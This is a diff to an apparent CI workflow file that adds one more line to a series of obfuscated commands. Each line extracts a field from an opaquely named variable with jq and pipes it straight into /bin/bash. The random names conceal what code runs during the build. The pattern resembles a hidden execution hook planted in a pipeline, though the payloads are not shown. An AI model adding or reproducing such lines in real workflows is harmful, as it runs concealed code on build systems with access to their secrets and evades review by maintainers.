@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$w19" | jq -r .z88475 | /bin/bash
           echo $lve54504 | jq -r .wt52806 | /bin/bash
           printf '%s' "$kilx31" | jq -r .kkfn122 | /bin/bash
+          echo $sc86 | jq -r .lxo6 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
